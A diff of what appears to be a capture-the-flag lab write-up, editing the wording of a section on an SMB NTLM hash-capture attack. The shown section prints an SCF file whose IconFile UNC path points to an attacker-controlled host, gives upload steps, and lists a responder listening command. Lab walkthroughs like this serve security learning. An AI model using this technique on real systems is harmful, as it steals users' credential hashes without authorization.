@@ -27,7 +27,7 @@ Nmap done: 1 IP address (1 host up) scanned in 57.56 seconds
 Also from crackmapexec,
 ![[Pasted image 20211007183540.png]]
 ## If SMB signing is disabled we can do NTLM relay attack
-If SMB signing is disabled we can do NTLM relay attack to get user hash.To perform this attack we will first start `responder` tool in and on http://10.10.11.106/fw_up.php we will upload Shell Command File `.scf` file with following contents 
+If SMB signing is disabled we can do NTLM relay attack to get user hash.To perform this attack we will first start `responder` tool  and on http://10.10.11.106/fw_up.php we will upload Shell Command File with extention `.scf` file with following contents.
 ```bash
 [Shell]
 
@@ -39,7 +39,7 @@ IconFile=\\10.10.14.98\share\dfsdfsdf.scf # IP address with which responder is s
 
 Command=ToggleDesktop
 ```
-Note: SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share as explained in [link](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).
+Note: SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share as explained in [link](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/). ONLY `.scf` FILE WILL WORK IN THIS CASE.
 As soon as we upload a `.scf.` with  filename starting from `@` (so that file is placed first in folder and executed as soon as it is uploaded).
 ## Uploading `.scf` to get NTLM Hash via responder
 Uploading `.scf` to get NTLM Hash via responder listening via command ` sudo responder -I tun0 -wrf`.
